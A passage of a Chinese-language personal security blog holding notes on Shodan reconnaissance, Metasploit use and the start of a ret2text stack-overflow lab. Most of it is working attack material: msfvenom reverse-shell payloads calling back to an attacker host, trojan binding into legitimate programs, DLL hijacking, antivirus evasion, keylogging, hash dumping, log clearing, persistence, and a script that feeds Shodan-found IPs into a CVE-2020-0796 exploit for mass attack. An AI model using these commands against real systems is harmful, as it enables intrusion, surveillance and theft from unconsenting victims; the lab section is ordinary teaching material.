</code></pre></div></div>
<h4 id="迂回策略入侵">迂回策略入侵</h4>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>inurl:cms/data/templates/images/index/
</code></pre></div></div>
<h4 id="exploit-db">exploit-db</h4>

<p>可以直接使用<a href="https://www.exploit-db.com/">exploit-db</a>中的GHDB(Google Hacking Database)</p>

<ul>
<li style="list-style-type: none;">
    <p><img src="http://localhost:4000/screenshot/20211213InformationGathering/1.png" alt="1" /></p>
  </li>
</ul>

<h2 id="shodan">shodan</h2>

<h4 id="cve检测">CVE检测</h4>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>初始化： shodan init  &lt;api key&gt; 

shodan init aaaa
</code></pre></div></div>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#shellcode指纹
shodan search --limit 10 --fields ip_str,port '"\x03\x00\x00\x0b\x06\xd0\x00\x00\x124\x00"'

shodan search --limit 10 --fields ip_str,port "\x03\x00\x00\x0b\x06\xd0\x00\x00\x124\x00" country:jp

shodan search --limit 10 --fields ip_str,port vuln:cve-2019-0708

#保存json文件
shodan download filename --limit 10 '"\x03\x00\x00\x0b\x06\xd0\x00\x00\x124\x00"'

#解析json文件
shodan parse --fields ip_str filename.json.gz &gt; 0708.txt

#msf,加载文件的方式批量扫描ip地址
set rhost file://0708.txt
set targets
</code></pre></div></div>

<h4 id="vnc空密码">VNC空密码</h4>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>shodan count '"\x03\x00\x00\x0b\x06\xd0\x00\x00\x124\x00"'

shodan honeyscore ip

shodan host ip --history

#端口未授权
shodan search --limit 10 --fields ip_str "authentication disabled" port:5900
</code></pre></div></div>

<h4 id="搜索路由器">搜索路由器</h4>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#查看本地的出口ip
shodan myip

#查看被黑的网站
shodan search --limit 10 --fields ip_str,port http.title:hacked by
shodan search --limit 10 --fields ip_str,port http.title:hacked by country:cn
shodan search --limit 10 --fields ip_str,port http.title:hacked by country:jp

city:chengdu

shodan search --limit 10 --fields ip_str,port http.title:yako country:cn

#思科
shodan search --limit 10 --fields ip_str,port "cisco -authorized" port:23
#爆破
+hydra
</code></pre></div></div>

<h4 id="搜索组件">搜索组件</h4>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#google搜索网段,美国国家安全局IP
nsa ip address range

shodan search --limit 10 --fields ip_str,port net:208.88.84.0/24

org:baidu
hostname:google
http.waf:Safedog

#ip信息收集
shodan host ip

#html Login页面收集
http.html:login

#mongodb:
shodan search  --limit 10 --fields ip_str "MongoDB Server information -authentication" port:27017 

#myphpadmin 3306  redis

#Jenkins:
"X-Jenkins" "Set-Cookie:JSESSIONID" http.title:"Dashboard"
</code></pre></div></div>

<h4 id="moniter-和图形界面">Moniter 和图形界面</h4>

<p>网页搜索与命令搜索相同，不过可以看清地域分布和计数</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>webcam
</code></pre></div></div>

<h4 id="monitor-network"><strong>Monitor Network</strong></h4>

<p>单一目标针对搜索，shodan非实时性</p>

<p>扫描结果可以连接email / TG</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>product:Apache httpd
org:Tencent cloud
</code></pre></div></div>

<h4 id="teamserver">teamserver</h4>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http.component:jQuery bootstrap
has_screenshot:true encrypted attention
industrial control systems ics
screenshot.label:ics

shodan stats --facets ssl.version country:cn has_ssl:true HTTP
shodan scan submit ip


port 50050 country:cn 
product "cobalt strike team server"
</code></pre></div></div>]]></content><author><name>true</name></author><summary type="html"><![CDATA[[TOC]]]></summary></entry><entry><title type="html">Metasploit</title><link href="http://localhost:4000/2021/06/08/msf.html" rel="alternate" type="text/html" title="Metasploit" /><published>2021-06-08T17:16:00+08:00</published><updated>2021-06-08T17:16:00+08:00</updated><id>http://localhost:4000/2021/06/08/msf</id><content type="html" xml:base="http://localhost:4000/2021/06/08/msf.html"><![CDATA[<p>[TOC]</p>

<h4 id="msf更新">msf更新</h4>
<p>apt update,apt install metasploit-framework</p>

<h4 id="木马配置基础">木马配置基础</h4>

<p>?/help 查看帮助</p>

<h4 id="functions">Functions</h4>

<p>自启动</p>

<p>键盘记录</p>

<p>进程管理</p>

<p>注册表管理</p>

<p>计划任务管理</p>

<p>文件管理</p>

<p>commandline等等</p>

<p>兼容性（C/C++）</p>

<h4 id="android配置">android配置</h4>

<p>Vicitms工具可以简单配置，通过模拟器复现apk上线操作</p>

<h3 id="msf配置">MSF配置</h3>

<h4 id="配置监听和生成">配置监听和生成</h4>

<p>msfconsole use exploit/multi/handler TCP反弹shell监听方式</p>

<p>show options进行配置</p>

<p>show payload查看木马选项</p>

<p>木马生成msfvenom -h查看帮助选项</p>

<p>msfvenom -l formats查看可输出格式</p>

<p>msfvenom -l archs查看可输出架构模式</p>

<p>msfvenom -l platforms查看可输出平台模式</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p windows/meterperter/reverse_tcp -f exe -a x86 --platforms windows -o ../../test.exe LHOST=192.ip.ip.ip LPORT=4444
</code></pre></div></div>

<p>meterpreter help查看可使用命令</p>

<h4 id="生成vbs">生成VBS</h4>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p windows/meterperter/reverse_tcp -f vbs -a x86 --platform windows -o ../../test.exe LHOST=192.ip.ip.ip LPORT=4444
</code></pre></div></div>

<h4 id="写文件">写文件</h4>

<p>写shell，以x86为例</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">ip</span><span class="o">=</span>192.168.113.113
<span class="nv">port</span><span class="o">=</span>4444
<span class="nb">arch</span><span class="o">=</span>x86
<span class="nv">platform</span><span class="o">=</span>windows
<span class="nv">format</span><span class="o">=</span>vbs
<span class="nv">payload</span><span class="o">=</span>windows/meterpreter/reverse_tcp

out <span class="o">=</span> ~/exploit/meter_rev_tcp_x86.vbs
msfvenom <span class="nt">-p</span> <span class="nv">$payload</span> <span class="nv">LHOST</span><span class="o">=</span><span class="nv">$ip</span> <span class="nv">LPORT</span><span class="o">=</span><span class="nv">$port</span> <span class="nt">-f</span> <span class="nv">$format</span> <span class="nt">-a</span> <span class="nv">$arch</span> <span class="nt">--platform</span> <span class="nv">$platform</span> <span class="nt">-o</span> <span class="nv">$out</span>
</code></pre></div></div>

<h4 id="读文件">读文件</h4>

<p>读rc</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST ip.ip.ip.ip
set LPORT 4444
run
</code></pre></div></div>

<p>msfconsole -r file</p>

<h3 id="木马捆绑">木马捆绑</h3>

<p>-x 捆绑exe</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ip=192.168.113.113
port=4444
arch=x86
platform=windows
format=exe
payload=windows/meterpreter/reverse_tcp
x=/home/kali/test/test.exe

out = ~/exploit/meter_rev_tcp_x86.exe
msfvenom -p $payload LHOST=$ip LPORT=$port -f $format -a $arch --platform $platform -o $out -x $x
</code></pre></div></div>

<h3 id="dll">DLL</h3>

<p>生成dll</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ip=192.168.113.113
port=4444
arch=x86
platform=windows
format=dll
payload=windows/meterpreter/reverse_tcp

out = ~/exploit/meter_rev_tcp_x86.dll
msfvenom -p $payload LHOST=$ip LPORT=$port -f $format -a $arch --platform $platform -o $out
</code></pre></div></div>

<p>使用IDA打开后，在export导出表中可以查看entrypoint</p>

<p>view-A中可以找到DLLentrypoint函数</p>

<h4 id="dll利用">DLL利用</h4>

<p>cmd/powershell</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rundll32 C:/file.dll dll.DLLentrypoint
</code></pre></div></div>

<p>bat/加载器</p>

<p>dll更名为其他进程同名dll加载  /   用c++合并dll   /  dll劫持</p>

<h3 id="dll劫持">DLL劫持</h3>

<p>以计算器calc.exe为例，假设存在div.dll被动态调用，函数被call</p>

<p>如果calc.exe call  div(evil).dll （同名覆盖）在evil.dll去调用div.dll</p>

<p>可以使用C++编写/ Aheadlib工具</p>

<p>拷贝Aheadlib代码到vs，找到DLLmain中执行加载</p>

<p>loadlibraryA(“back.dll”),编译需要属性设置C++代码生成运行库设置 多线程MT</p>

<p>dll劫持：
a.exe 调用 b.dll 有一个 func（）</p>

<p>b.dll 改名bb.dll(或者直接根据路径劫持)</p>

<p>写一个b.dll 有一个 func-x() 在func(加载bb.dll) -&gt;bb.dll调用func()</p>

<p>运行windows加载dll 主程序目录查找b.dll/系统路径下/环境变量路径
key:b.dll里的函数名称和函数参数
1：直接重新编译源码替换文件
2：反编译</p>

<p>调试：查看有没有某个dll缺失之后exe无法运行，则为劫持目标</p>

<p>VS：创建DLL MFC DLL-&gt;共享 
入口定义，工程属性Release MFC的使用改为静态</p>

<p>劫持ws2_32.dll可以实现抓包，改包，转向等
伪造导出表ep:</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#pragma comment(linker, "/EXPORT:LpkInitialize=_gamehacker_LpkInitialize,@1")
</code></pre></div></div>

<p>dll导出表和劫持源码生成工具 load（）函数一般为工具生成的原本的dll，其上为注入函数</p>

<p>注入最好是在保护机制开启之前被调用的dll</p>

<h3 id="hta">HTA</h3>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>platform=hta-psh
</code></pre></div></div>

<p>基于HTML，木马中包含vbsscript,执行windows窗口不可见，创建了wscript.shell对象，执行powershell，小众木马</p>

<h3 id="编码混淆">编码混淆</h3>

<p>encoder/IDA分析</p>

<p>msfvenom -l encoder 查看编码混淆</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">encoder</span><span class="o">=</span>x86/shikata_ga_nai
<span class="nv">i</span><span class="o">=</span>10
msfvenom <span class="nt">-e</span> <span class="nv">$encoder</span> <span class="nt">-i</span> <span class="nv">$i</span>
</code></pre></div></div>

<h3 id="keep">keep</h3>

<p>捆绑exe时新开线程启动</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p $payload LHOST=$ip LPORT=$port -f $format -a $arch --platform $platform -o $out -x $x -k
</code></pre></div></div>

<p>ep:</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p windows/meterpreter/reverse_tcp -f exe -a x86 --platform windows -o /home/yako/back.exe LHOST=192.168.113.133 LPORT=4444 -x /home/yako/桌面/hfs2.3.exe -k
</code></pre></div></div>

<h4 id="文件操作">文件操作</h4>

<p>meterpreter
ls/cat/edit flie 查看/编辑文件(可以使用命令dir，windows只有Dir但是应该具有ls转换)
cat exp.ini
edit exp.ini
getwd 远程方法获取当前路径
getlwd
pwd
mkdir filename创建文件夹
rmdir
cp文件</p>

<p>windows,shell中</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>attrib -h -s *
</code></pre></div></div>

<p>mv/lls/search</p>

<p>移动文件/查看写入执行等属性/查找文件</p>

<p>show_mount查看驱动器</p>

<p>download filename(windows本地) 传输文件到本地
upload</p>

<p>checksum md5(也可以查看其他)查看md5文件指纹</p>

<h4 id="系统命令">系统命令</h4>

<p>ps #列出所有进程</p>

<p>getsysytem -h #提权
getsystem -t 0 #所有可以提权的方式</p>

<p>rev2self #回到初始权限</p>

<p>clearev #清除权限，清除日志</p>

<p>drop_token #从进程窃取</p>

<p>execute -h#执行命令
ep: execute -f notepad
隐藏执行/从内存执行</p>

<p>getenv #获取环境变量
getpid #获取进程id，通过这个来获取tid线程id,ppid父进程</p>

<p>getprivs #根据windows编程当中的函数获取权限
ep: debug</p>

<p>getsid #windows账户机制
getuid #当前账户</p>

<p>kill pid #杀进程
localtime #显示时间</p>

<p>pgrep -h #筛选进程
ep: pgrep notepad（像find）</p>

<p>pkill #通过名称杀进程
pkill notepad</p>

<p>reg #写注册表</p>

<p>run post/windows/gather/hashdump(getsystem)然后通过hash爆破</p>

<p>reboot
shutdown
sysinfo
suspend -h #进程挂起
ep: suspend notepad
suspend -r #恢复</p>

<p>shell #中文编码修改
shell中set查看环境变量</p>

<h4 id="网络操作">网络操作</h4>

<p>arp #查看arp表
getproxy #查看代理
ipconfig
netstat
route -h#查看路由表
resolve #解析域名
portfwd -h #端口转发
ep: port add -l 6666 -p 3389 -r 被控机ip （delete）</p>

<p>portfwd list查看</p>

<h4 id="其他操作">其他操作</h4>

<p>enumdesktops #枚举桌面
setdesktop -h #设置桌面
getdesktop 
keyborad_send
keyevent -h #设置按下抬起 keycode(13 回车)press
keyscan_dump
keyscan_start
keyscan_stop
mouse doubleclick 双击
mose move</p>

<p>screenshare
screenshot
uictl #控制接口单元
ep: uictl disable/enable keyboard/all</p>

<p>timestomp back.exe -v #修改时间戳</p>

<p>webcanm
play #播放鬼音乐</p>

<h4 id="多木马控制">多木马控制</h4>

<p>background/bg
session
set exitonsession false #支持多个木马连接</p>

<p>run/exploit -h
run -j  #后台静默
jobs #查看后台</p>

<p>session -i 1 #选中</p>

<p>jobs -h
jobs -k #关闭</p>

<h4 id="持久化">持久化</h4>

<p>show advanced #查看高级选项设置</p>

<p>run tab #查看可执行脚本
run persistence -h #可持久化操作
-x 自启动
-i 心跳设置
-p 连接端口
-r 需要连接的ip
msf会创建一个脚本进行执行，添加注册表</p>

<p>shell设置/dll加载注入/自启动进程劫持</p>

<p>ep:</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter&gt;run persistence -X -i 3 -p 4444 -r ip
</code></pre></div></div>

<h4 id="进程迁移">进程迁移</h4>

<p>木马进程转移
core命令集中使用migrate
migrate -h 
-P pid -N name -t timeout</p>

<h4 id="msf漏洞扫描">MSF漏洞扫描</h4>

<p>msf6&gt;back#回退
/usr/share/msf中修改代码</p>

<p>msf6&gt;makerc /home/destop/a.rc#保存历史命令记录
resource#读取rc</p>

<p>msf6&gt;rename_job 0 aaa #更改job名称
kill jobid#关闭job名称</p>

<p>msf6&gt;search name: 0708/0708 #筛选/未筛选名称 可用漏洞
show auxiliary #查看扫描检查
show exploit#查看攻击
set target#设置目标系统
check#检查漏洞（部分攻击模块没有）（ms17-010）</p>

<h4 id="msf内网穿透">MSF内网穿透</h4>

<p>公网上面开启frp
~/frp_linux_amd64 ./frps -c frps.ini
需要配置,但是也可以使用默认配置</p>

<p>客户端
./frpc -c frpc.ini
需要配置
ep:</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[common]
server_addr = 公网ip
server_port = 7000

[ssh]
type = tcp
local_ip = 127.0.0.1
local_port = 22
local_port =6000

[msf]
type = tcp
local_ip = 127.0.0.1
local_port = 6666
remote_port = 7002
</code></pre></div></div>

<p>msf木马设置需要设置为公网ip: port（[msf]remoteport）
监听需要设置为本地：127.0.0.1: 转发端口[msf local_port]</p>

<p>如果使用CS的话可以不用部署，如果你的CS版本中未有此功能或者失效同样可以配置Frp</p>

<h4 id="stager">stager</h4>
<p>meterpreter:
1 single#单体木马
2 stager/stage#windows/stage/stager
攻击成功后先放入stager仅做连接
剩余做的动态连接库和恶意文件发送到stage(防止dump/功能分离)</p>

<p>stager=https/http/tcp/uuid
stage=meterpeter/peinject/shell/vncinject</p>

<p>reverse反向
bind正向</p>

<p>msf6&gt;show payloads
msf6&gt;show exploits</p>

<h4 id="零碎handler">零碎/handler</h4>
<p>payload的设置大同小异，但是部分payload的设置需要SRVhost，这是指访问地址，如果chrome0day等，也有设置宏文件doc等exploit模块</p>

<p>设置好后可以使用handler直接设置好监听模块</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6&gt;exploit(mulit/fileformat/office_word)&gt;handler -H 192.ip.ip.ip -P 4444 -p windows/meterpreter/reverse_tcp -n(name) bilibili 
</code></pre></div></div>

<h4 id="linux木马">linux木马</h4>

<p>generate -h 生成功能</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6&gt;use payload/linux/x64/meterpreter/reverse_tcp

set lhost ip
</code></pre></div></div>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 payload(linux)&gt;generate -f elf -o ~/test
</code></pre></div></div>

<p>meterpretere中execute命令会将命令转换成win/linux/mac/ios等不同平台下的可执行命令</p>

<h4 id="mac木马">mac木马</h4>

<p>与win/linux平台类似，mac下它的文件格式为macho</p>

<p>使用file+文件名查看文件信息，可执行信息</p>

<p>不同平台中meterpreter不同平台可用命令也会有相当的差异</p>

<h4 id="androidios木马">android/ios木马</h4>

<p>由于msf不会直接打包android和ios，由于其可以加载elf-so所以需要加载器</p>

<p>msfvenom可以生成apk</p>

<h4 id="跨平台木马设置">跨平台木马设置</h4>

<p>解释器语言生成木马
python/java/php/ruby</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>set payload /ruby/shell_reverse_tcp

generate -f rb -o ~/back.rb
generate -f raw -o ~/back.rb


generate -f python -o ~/back.py
generate -f raw -o ~/back.py
</code></pre></div></div>

<h4 id="cve-2020-0796">cve-2020-0796</h4>

<p>需要搭建靶场环境查找系统安装补丁号
systeminfo
KB4551762</p>

<p>exploitdb找到cve-2020-0796的exploit脚本
由于console没有变量名替换，通过msfvenom生成</p>

<p>-b 取消滑块 ‘\x00\xff’
-v 指定变量名</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p windows/xx/xxx/xxxtcp lhost=ip.ip.ip.ip lport=4444 -f python -v USER_PAYLOAD -b '\x00\xff'
</code></pre></div></div>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.113.133 LPORT=4444 -f python -v USER_PAYLOAD -b '\0x00' 
</code></pre></div></div>

<p>按指定变量名替换shellcode之后，在exploit.py当中可以结合shadon进行ip扫描攻击，获取meterpreter
但此脚本很不稳定，常攻击失败shellcode读取不到，msf监听会断</p>

<p>shodan需要使用api对接，生成扫描到的txt文件，在通过修改exploit脚本为读取ip地址文件</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">shodan</span>
<span class="n">SHODAN_API_KEY</span> <span class="o">=</span> <span class="s">"API_Key"</span>
<span class="n">api</span> <span class="o">=</span> <span class="n">shodan</span><span class="p">.</span><span class="n">Shodan</span><span class="p">(</span><span class="n">SHODAN_API_KEY</span><span class="p">)</span>
</code></pre></div></div>
<p>搜索结果</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">try</span><span class="p">:</span>
    <span class="c1">### 搜索 Shodan
</span>    <span class="n">results</span> <span class="o">=</span> <span class="n">api</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="s">'apache'</span><span class="p">)</span>
    <span class="c1">### 显示结果
</span>    <span class="k">print</span> <span class="s">'Results found: %s'</span> <span class="o">%</span> <span class="n">results</span><span class="p">[</span><span class="s">'total'</span><span class="p">]</span>
    <span class="k">for</span> <span class="n">result</span> <span class="ow">in</span> <span class="n">results</span><span class="p">[</span><span class="s">'matches'</span><span class="p">]:</span>
            <span class="k">print</span> <span class="n">result</span><span class="p">[</span><span class="s">'ip_str'</span><span class="p">]</span>
<span class="k">except</span> <span class="n">shodan</span><span class="p">.</span><span class="n">APIError</span><span class="p">,</span> <span class="n">e</span><span class="p">:</span>
    <span class="k">print</span> <span class="s">'Error: %s'</span> <span class="o">%</span> <span class="n">e</span>
</code></pre></div></div>

<p>对开放端口的服务器做exp
ep读文件:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">ips</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">ip</span><span class="p">)</span>
<span class="k">for</span> <span class="n">ip</span> <span class="ow">in</span> <span class="n">ips</span><span class="p">.</span><span class="n">readlines</span><span class="p">():</span>
	<span class="k">try</span><span class="p">:</span>
		<span class="n">do_rce</span><span class="p">(</span><span class="n">ip</span><span class="p">.</span><span class="n">strip</span><span class="p">(),</span><span class="mi">445</span><span class="p">)</span>
	<span class="k">except</span><span class="p">:</span>
		<span class="k">pass</span>
</code></pre></div></div>

<h4 id="辅助模块">辅助模块</h4>

<p>辅助模块auxiliary，辅助模块的使用方式和exploit很相似需要setting，他有sql注入,1day,voip等等，辅助模块具有check的意义，在1day下，他并不会攻击仅利用poc进行扫描</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6&gt; use auxiliary/spoof/arp_poisoning
&gt;show options
&gt;set SHOSTS
</code></pre></div></div>

<p>show auxiliary</p>

<p>ep收集信息:</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>use auxiliary/gather/browser_info
&gt;show options
&gt;set srvhost kaliip
&gt;set srvport 80
&gt;run

using url: http://kaliip:80/zqsasd
started.
</code></pre></div></div>

<p>其他浏览器打开这个连接可收集这个信息</p>

<p>汇编中的滑块指令
show nops
ep:</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>use nop/x86/single_byte
show advanced
generate 20
buf=
"\x99\x4f.....\x41\x97"
</code></pre></div></div>

<h4 id="混淆模块">混淆模块</h4>
<p>encoders具有非常多的编码形式，可以编码代码或者文件</p>

<p>还有一个evasion模快比如：
evasion/windows/windows_defender_exe</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6&gt;show evasion
&gt;info evasion/windows/windows_defender_exe
</code></pre></div></div>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6&gt;use evasion/windows/windows_defender_exe
&gt;show options
### 这里不设置会默认使用x86meterpreter
&gt;run
#生成
</code></pre></div></div>
<p>生成后在导出表中将无法在看到部分函数，真正的代码解密后加载进入内存执行</p>

<h4 id="post">POST</h4>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6&gt;show post
</code></pre></div></div>
<p>handler中使用stage，具有sessions下可以使用</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#info查看信息，此处post为收集tomcat信息
msf6&gt;info post/windows/gather/enum_tomcat

#使用
meterpreter&gt;run post/windows/gather/enum_tomcat
</code></pre></div></div>

<p>post模块可以发送，注入，收集电脑的信息，比如chrome收集，也会自动去搜索存在的cookie,开启远程桌面等等</p>

<p>部分模块需要提权才可以使用
ep:
post/windows/gather/enum_patches
查看补丁模块</p>

<h4 id="插件">插件</h4>

<p>load加载插件,-l查看可以加载的插件</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>load -l
</code></pre></div></div>
<p>token_hunter,sqlmap,thread,wiki等等
ep:
load sqlmap
unload sqlmap
ep:
load nessus
等等</p>

<h4 id="getset">get/set</h4>

<p>set/setg
get/getg
设置变量/全局变量
ep:
msf6&gt;setg LHOST 192.168.1.1
msf6&gt;getg LHOST
下次use exploit就会设置好</p>

<h4 id="msf数据库">MSF数据库</h4>
<p>开启数据库服务
systemctl start postgresql 
数据库初始化
msf6&gt;msfdb init
查看状态
msf6&gt;db_status
查看hosts
msf6&gt;hosts
查看服务
msf6&gt;service
查看其他信息记录
msf6&gt;notes
查看执行信息
msf6&gt;loot
查看漏洞
msf6&gt;vulns</p>

<p>workspace功能，建立工作区，对数据分类
查看帮助
workspace -h
查看当前workspace信息
workspace -v
切换到默认
workspace default
添加
workspace -a yako</p>

<p>kali中使用下面数据库工具查看
dbeaver community
设置连接</p>

<p>db_export/db_import导入导出</p>

<h4 id="代码结构">代码结构</h4>
<p>MSF框架代码结构与模块生成</p>

<h4 id="使用结构">使用结构</h4>

<p>高级检查和虚拟机检测</p>

<p>https设置与tcp设置</p>

<h4 id="宏">宏</h4>

<p>仅可以针对开启了宏的计算机具有范围缺陷性</p>

<p>配置：选项-需要配置信任中心-启用所有宏、自定义功能区-开发工具</p>

<p>vba/vba-exe
msf宏主要生成宏语法，将语言进行加解密内存执行，调用kernel32动态链接库等等，生成stager</p>

<p>需要单步调式宏文件，shellcode已经由msf生成好了，但是变量值的获取方式需要手动修改（vba-exe）</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6&gt;search macro
</code></pre></div></div>
<p>msf中也可以生成宏文件</p>

<h4 id="vnc">VNC</h4>

<p>VNC类似3389由工具生成服务端和客户端，常有未授权VNC可以利用（不太支持高版本）</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6&gt;search type:exploit vnc
</code></pre></div></div>

<p>设置键盘执行，使用vba cmdstager</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6&gt;use exploit/multi/vnc/vnc_keyboard_exec
msf6&gt;set target 1
</code></pre></div></div>
<p>执行exploit（使用键盘输入）</p>

<p>VNC爆破可以尝试使用auxiliary/scanner/vnc/vnc_login</p>

<h4 id="dde">DDE</h4>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6&gt;use exploit/windows/fileformat/office_dde_delivery
msf6&gt;set srvhost (设置kali服务端)
msf6&gt;set srvpost (设置kali服务端端口)
</code></pre></div></div>
<p>设置好靶机ip生成msf.rtf
利用安全设置提示攻击（隐藏回车位置右键更新域查看域代码）
ddeauto C:路径…exe</p>

<p>msf6&gt;search fileformat查看文件格式 dde只是其中一种</p>

<h4 id="隐蔽执行">隐蔽执行</h4>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter&gt;execute -h
meterpreter&gt;execute -f notepad -a test.txt
meterpreter&gt;execute -f notepad -a test.txt -H
</code></pre></div></div>
<p>-H hidden创建隐藏进程</p>

<p>备份到kali一个cmd.exe文件</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter&gt;execute -f /home/cmd.exe -m(指定内存运行) -d notepad
</code></pre></div></div>
<p>-i交互cmd</p>

<p>32位需要对应32位，64位需要对应64位</p>

<h4 id="流量劫持">流量劫持</h4>

<h4 id="流量分析">流量分析</h4>

<h4 id="pivot">Pivot</h4>

<h4 id="域">域</h4>

<h4 id="adv">adv</h4>]]></content><author><name>true</name></author><category term="Metasploit" /><category term="msf" /><summary type="html"><![CDATA[[TOC]]]></summary></entry><entry><title type="html">ret2text ROP</title><link href="http://localhost:4000/2021/06/04/ret2textROP.html" rel="alternate" type="text/html" title="ret2text ROP" /><published>2021-06-04T11:45:00+08:00</published><updated>2021-06-04T11:45:00+08:00</updated><id>http://localhost:4000/2021/06/04/ret2textROP</id><content type="html" xml:base="http://localhost:4000/2021/06/04/ret2textROP.html"><![CDATA[<p>[TOC]</p>

<h3 id="ret2text">ret2text</h3>

<h4 id="elf">ELF</h4>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>file ./pwn
</code></pre></div></div>

<p>./pwn: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=9dc32140f0e317f9e6a59b9a226a5123e34ace21, not stripped</p>

<p>在计算机科学中，是一种用于<a href="https://baike.baidu.com/item/二进制文件/996661">二进制文件</a>、<a href="https://baike.baidu.com/item/可执行文件">可执行文件</a>、<a href="https://baike.baidu.com/item/目标代码/9407934">目标代码</a>、共享库和核心转储格式文件。</p>

<p>是UNIX系统实验室（<a href="https://baike.baidu.com/item/USL">USL</a>）作为应用程序二进制接口（Application Binary Interface，<a href="https://baike.baidu.com/item/ABI">ABI</a>）而开发和发布的，也是<a href="https://baike.baidu.com/item/Linux/27050">Linux</a>的主要可执行文件格式。</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>checksec pwn
</code></pre></div></div>

<p>检查保护机制——无保护机制</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>CANARY    : disabled
FORTIFY   : disabled
NX        : disabled
PIE       : disabled
RELRO     : Partial
</code></pre></div></div>

<h4 id="前言">前言</h4>

<p>关于栈溢出漏洞主要的利用方式是ROP(Return Oriented Programming)，即返回导向编程，通过栈溢出内容覆盖返回地址，使其跳转到我们想要执行恶意代码的位置中。而跳转的目标有可能是一段本就已经写好的可以执行恶意命令的函数，也有可能是某个全局变量空间，甚至构造一个系统调用的cpu指令，跳转到一个libc中的函数等。最终目的都是执行恶意命令。计算机发展迭代中对于栈溢出的保护手段也越来越完善，限于ALSR，PIP等等，本文对基础的栈溢出进行一些简单的学习。</p>

<h4 id="ret2text原理">ret2text原理</h4>

<p>控制返回地址指向程序本身已有的的代码(.text)并执行</p>

<pre><code class="language-C++">#include &lt;stdlib.h&gt;
int sys(){
	system("/bin/sh");
}
int func(){
	char a[10];
	gets(a);
	puts(a);
}
int main(){
	func();
}	
</code></pre>

<p>vim ret2.c编辑一个简单C文件</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gcc -g -fno-stack-protector -no-pie -o ret2 ret2.c
</code></pre></div></div>

<p>无保护编译，-fno关闭所有栈帧保护</p>

<h4 id="分析">分析</h4>

<p>从程序代码上看，分成三个部分，main,func,sys三个函数，sys函数中调用了/bin/sh，函数中，char a为[10]，</p>

<p>gets() 函数的功能是从输入缓冲区中读取一个字符串存储到字符指针变量 str 所指向的内存空间。使用 gets() 时，系统会将最后“敲”的换行符从缓冲区中取出来，然后丢弃，所以缓冲区中不会遗留换行符。</p>

<p>输出字符串时都使用printf，通过“%s”输出字符串,更简单的方法就是使用 puts() 函数。</p>

<p>这里获取输入的char a——gets——puts</p>

<p>程序中获取charA的gets函数无限制的取出char，突破char[10]的限制，造成在缓冲区取数据的时候造成程序溢出</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb ret2
